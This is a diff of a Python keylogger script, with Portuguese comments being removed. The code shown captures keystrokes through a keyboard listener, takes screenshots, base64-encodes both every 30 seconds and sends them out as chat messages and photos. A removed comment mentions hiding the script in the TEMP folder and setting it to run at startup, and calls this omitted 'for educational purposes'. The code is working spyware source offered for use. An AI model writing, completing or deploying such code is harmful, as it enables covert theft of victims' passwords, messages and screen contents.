@@ -22,29 +22,24 @@ def send_initial_message():
 
 def send_logs_and_screenshot():
     while True:
-        time.sleep(30)  # intervalo de 30 segundos
+        time.sleep(30)  
 
         with lock:
             if not keylogs:
                 continue
             text = "".join(keylogs)
             keylogs.clear()
-
-        # Envia keylogs codificados em base64 (texto normal codificado inteiro)
+            
         encoded_text = text_to_base64(text)
 
-        # Envia screenshot codificada em base64
         img_base64 = image_to_base64()
-
-        # Envia mensagem texto e foto
+        
         send_message(f"⌨️ Logs (last 30s) in Base64:\n`{encoded_text}`")
         if img_base64:
             send_photo_base64(img_base64, caption="🖼️ Screenshot (last 30s)")
 
 def main():
-    # Esconde o script na pasta TEMP e tenta startup (implementa conforme preferires)
-    # Para fins educacionais, omitido aqui, mas pode ser adicionado
-
+    
     send_initial_message()
 
     listener = keyboard.Listener(on_press=on_press)
